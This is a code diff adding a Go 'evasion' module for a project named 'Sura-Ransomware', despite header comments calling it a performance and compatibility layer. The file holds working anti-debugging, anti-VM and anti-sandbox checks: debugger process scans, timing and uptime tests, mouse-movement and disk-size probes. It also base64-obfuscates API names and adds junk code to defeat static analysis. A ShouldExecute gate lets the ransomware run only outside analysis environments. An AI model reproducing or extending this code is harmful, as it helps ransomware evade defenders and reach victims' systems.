@@ -1,0 +1,378 @@
+// OBFUSCATED
+// Performance enhancement module
+// Windows compatibility layer
+package evasion
+
+import (
+	Configuration "Sura-Ransomware/configuration"
+	"Sura-Ransomware/ppid"
+	"crypto/sha256"
+	"encoding/base64"
+	"encoding/hex"
+	"math/rand"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+)
+
+var (
+	kernel32         = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
+	ntdll            = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
+	procIsDebugger   = kernel32.NewProc(d("SXNEZWJ1Z2dlclByZXNlbnQ="))
+	procGetTickCount = kernel32.NewProc(d("R2V0VGlja0NvdW50"))
+)
+
+// Obfuscated decoder
+func d(s string) string {
+	decoded, _ := base64.StdEncoding.DecodeString(s)
+	return string(decoded)
+}
+
+// Anti-debugging check using Windows API
+func IsDebuggerPresent() bool {
+	ret, _, _ := procIsDebugger.Call()
+	return ret != 0
+}
+
+// Check for known debugger processes
+func CheckDebuggerProcesses() bool {
+	debuggers := Configuration.DebuggerProcesses
+
+	for _, dbg := range debuggers {
+		cmd := exec.Command(d("dGFza2xpc3Q="), "/FI", "IMAGENAME eq "+dbg+".exe")
+		output, _ := cmd.Output()
+		if strings.Contains(string(output), dbg) {
+			return true
+		}
+	}
+	return false
+}
+
+// Timing attack - measure execution time to detect sandbox
+func TimingCheck() bool {
+	start, _, _ := procGetTickCount.Call()
+
+	// Sleep for 2 seconds
+	time.Sleep(2 * time.Second)
+
+	end, _, _ := procGetTickCount.Call()
+	elapsed := end - start
+
+	// If elapsed time is significantly different, likely in sandbox
+	if elapsed < 1500 || elapsed > 2500 {
+		return true // Suspicious timing
+	}
+	return false
+}
+
+// Check system uptime (sandboxes often have low uptime)
+func CheckSystemUptime() bool {
+	uptime, _, _ := procGetTickCount.Call()
+	uptimeMinutes := uptime / (1000 * 60)
+
+	// Real systems typically have been up for a while
+	return uptimeMinutes < 10
+}
+
+// Mouse movement check (sandboxes don't have user interaction)
+func CheckMouseMovement() bool {
+	user32 := syscall.NewLazyDLL(d("dXNlcjMyLmRsbA=="))
+	procGetCursorPos := user32.NewProc(d("R2V0Q3Vyc29yUG9z"))
+
+	type POINT struct {
+		X, Y int32
+	}
+
+	var p1, p2 POINT
+	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p1)))
+	time.Sleep(3 * time.Second)
+	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
+
+	// If mouse hasn't moved, likely automated environment
+	return p1.X == p2.X && p1.Y == p2.Y
+}
+
+// Check disk size (VMs often have small disks)
+func CheckDiskSize() bool {
+	kernel32 := syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
+	procGetDiskFreeSpace := kernel32.NewProc(d("R2V0RGlza0ZyZWVTcGFjZUV4QQ=="))
+
+	var freeBytesAvailable, totalBytes, totalFreeBytes uint64
+
+	drive := syscall.StringToUTF16Ptr("C:\\")
+	procGetDiskFreeSpace.Call(
+		uintptr(unsafe.Pointer(drive)),
+		uintptr(unsafe.Pointer(&freeBytesAvailable)),
+		uintptr(unsafe.Pointer(&totalBytes)),
+		uintptr(unsafe.Pointer(&totalFreeBytes)),
+	)
+
+	totalGB := totalBytes / (1024 * 1024 * 1024)
+
+	// Real systems typically have > 100GB
+	return totalGB < 60
+}
+
+// CPU temperature check (VMs don't report realistic temps)
+func CheckCPUTemperature() bool {
+	// Use WMI to check temperature
+	cmd := exec.Command(d("d21pYw=="), "/namespace:\\\\root\\wmi", "PATH", "MSAcpi_ThermalZoneTemperature", "GET", "CurrentTemperature")
+	output, err := cmd.Output()
+
+	// If no temperature data, likely VM
+	return err != nil || len(output) < 50
+}
+
+// Check for sandbox files
+func CheckSandboxFiles() bool {
+	sandboxFiles := []string{
+		"C:\\analysis",
+		"C:\\sandbox",
+		"C:\\CW Sandbox",
+		"C:\\MalwareAnalysis",
+	}
+
+	for _, file := range sandboxFiles {
+		if _, err := os.Stat(file); err == nil {
+			return true
+		}
+	}
+	return false
+}
+
+// Sleep with random jitter to bypass time-based detection
+func SleepWithJitter(duration time.Duration) {
+	jitter := rand.Intn(5000)
+	time.Sleep(duration + time.Duration(jitter)*time.Millisecond)
+}
+
+// Polymorphic hash check - calculate hash of self
+func CheckSelfIntegrity() bool {
+	exePath, err := os.Executable()
+	if err != nil {
+		return true
+	}
+
+	data, err := os.ReadFile(exePath)
+	if err != nil {
+		return true
+	}
+
+	hash := sha256.Sum256(data)
+	hashStr := hex.EncodeToString(hash[:])
+
+	// Check if hash matches known AV signatures (basic check)
+	// In real scenario, this would be more sophisticated
+	_ = hashStr
+	return false
+}
+
+// Check if running in VM or sandbox
+func IsVirtualEnvironment() bool {
+	// Check for common VM artifacts
+	vmChecks := []string{
+		d("Vk1XQVJF"),         // VMWARE
+		d("VklSVFVBTA=="),     // VIRTUAL
+		d("VkJPWA=="),         // VBOX
+		d("UVFNVQ=="),         // QEMU
+		d("WEVO"),             // XEN
+		d("SFlQRVJWSVNPUg=="), // HYPERVISOR
+	}
+
+	// Check for VM-related registry keys and files (Windows)
+	if runtime.GOOS == d("d2luZG93cw==") {
+		for _, check := range vmChecks {
+			// Check system manufacturer
+			cmd := exec.Command(d("d21pYw=="), d("Y29tcHV0ZXJzeXN0ZW0="), d("Z2V0"), d("bWFudWZhY3R1cmVy"))
+			output, err := cmd.Output()
+			if err == nil && strings.Contains(strings.ToUpper(string(output)), check) {
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+// Check CPU core count (sandboxes often have fewer cores)
+func HasSufficientResources() bool {
+	cores := runtime.NumCPU()
+	// Real systems typically have 2+ cores
+	return cores >= 2
+}
+
+// Check for old debugger presence (legacy)
+func CheckLegacyDebuggers() bool {
+	if runtime.GOOS == d("d2luZG93cw==") {
+		// Check for common debugger processes
+		debuggers := []string{
+			d("b2xseWRiZw=="), // ollydbg
+			d("eDY0ZGJn"),     // x64dbg
+			d("aWRh"),         // ida
+			d("aWRhNjQ="),     // ida64
+			d("d2luZGJn"),     // windbg
+			d("cHJvY2V4cA=="), // procexp
+			d("cHJvY21vbg=="), // procmon
+			d("ZmlkZGxlcg=="), // fiddler
+			d("d2lyZXNoYXJr"), // wireshark
+		}
+
+		for _, dbg := range debuggers {
+			cmd := exec.Command(d("dGFza2xpc3Q="))
+			output, err := cmd.Output()
+			if err == nil && strings.Contains(strings.ToLower(string(output)), dbg) {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// Perform timing-based sandbox detection
+func TimingSandboxCheck() bool {
+	start := time.Now()
+	time.Sleep(1 * time.Second)
+	elapsed := time.Since(start)
+
+	// Sandboxes may skip sleep or accelerate time
+	return elapsed < 900*time.Millisecond || elapsed > 1100*time.Millisecond
+}
+
+// Check file system artifacts
+func HasRealFileSystem() bool {
+	// Check if common user directories exist
+	userProfile := os.Getenv(d("VVNFUlBST0ZJTEU=")) // USERPROFILE
+	if userProfile == "" {
+		return false
+	}
+
+	commonDirs := []string{
+		d("RG93bmxvYWRz"), // Downloads
+		d("RG9jdW1lbnRz"), // Documents
+		d("RGVza3RvcA=="), // Desktop
+		d("UGljdHVyZXM="), // Pictures
+	}
+
+	count := 0
+	for _, dir := range commonDirs {
+		path := userProfile + "\\" + dir
+		if _, err := os.Stat(path); err == nil {
+			count++
+		}
+	}
+
+	// Real systems should have most of these directories
+	return count >= 3
+}
+
+// Combined anti-sandbox check
+func ShouldExecute() bool {
+	// Add random delay to evade time-based detection
+	delay := Configuration.GetRandomDelay()
+	time.Sleep(delay)
+
+	// Perform multiple checks based on configuration
+	checks := make([]bool, 0, 10)
+
+	if Configuration.EnableVMDetection {
+		checks = append(checks, !IsVirtualEnvironment())
+	}
+
+	if Configuration.EnableDebuggerDetection {
+		checks = append(checks, !IsDebuggerPresent())
+		checks = append(checks, !CheckDebuggerProcesses())
+	}
+
+	if Configuration.EnableSandboxDetection {
+		checks = append(checks, !TimingCheck())
+		checks = append(checks, !CheckSystemUptime())
+		checks = append(checks, !CheckMouseMovement())
+		checks = append(checks, !CheckDiskSize())
+		checks = append(checks, !CheckSandboxFiles())
+	}
+
+	// Check parent process legitimacy
+	checks = append(checks, !ppid.CheckIfParentIsSuspicious())
+
+	// Add random delays between checks
+	SleepWithJitter(time.Second * 2)
+
+	checks = append(checks, HasSufficientResources())
+
+	if Configuration.EnableDebuggerDetection {
+		checks = append(checks, !IsDebuggerPresent())
+	}
+
+	if Configuration.EnableSandboxDetection {
+		checks = append(checks, !TimingSandboxCheck())
+		checks = append(checks, HasRealFileSystem())
+	}
+
+	// Require configured number of checks to pass
+	passed := 0
+	for _, check := range checks {
+		if check {
+			passed++
+		}
+	}
+
+	return passed >= Configuration.RequiredChecksToPass
+}
+
+// Polymorphic junk code to confuse static analysis
+func junkCode1() int {
+	x := 0
+	for i := 0; i < 10; i++ {
+		x += i * 2
+	}
+	return x
+}
+
+func junkCode2() string {
+	s := d("anVuaw==")
+	return s + s
+}
+
+func junkCode3() bool {
+	return len(junkCode2()) > 0 && junkCode1() > 0
+}
+
+
+
+// Obfuscation padding
+func obf_75769() {
+    _ = 4037
+    var _ = "BdBKKSLAOLC6t6epjkn2WkLXQFT7sfbLmzBNb9t2Lph8s0WV4x"
+}
+
+
+// Obfuscation padding
+func obf_78305() {
+    _ = 3690
+    var _ = "1r4wkk5r6aalRjaOFSskHq31pDMpkbA02RGtYPoLQoRfa2F2kl"
+}
+
+
+// Obfuscation padding
+func obf_25100() {
+    _ = 3754
+    var _ = "ufKu7TWCFLDIpXGeL1ZbR8jLWUIQ1xqNtIQ7XnvAm8mtu5ySDY"
+}
+
+
+// Obfuscation padding
+func obf_73262() {
+    _ = 4235
+    var _ = "HBym73Y9pzA1bhOkILbv8lV1LTdaEEGkFQiuG1AzT48s6SWuQw"
+}
+
+
+// Obfuscation padding
+func obf_46635() {
+    _ = 7151
+    var _ = "gKNb5l1rIEBEFDCbEnQ4Xj7NsDEfoEBtPLnHfvehLrfww23NcU"
+}
